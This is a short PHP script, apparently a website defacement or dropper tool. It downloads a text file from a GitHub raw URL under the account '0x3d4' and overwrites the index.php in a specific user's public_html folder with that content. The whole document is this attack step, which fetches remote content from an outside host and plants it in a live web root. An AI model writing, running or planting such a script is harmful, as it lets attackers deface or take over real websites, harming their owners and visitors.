<?php
$dosyaicerik = file_get_contents("https://raw.githubusercontent.com/0x3d4/index/master/eski.txt");
$dosya = fopen('/home/rafya/public_html/index.php', 'w');
fwrite($dosya, $dosyaicerik);
fclose($dosya);
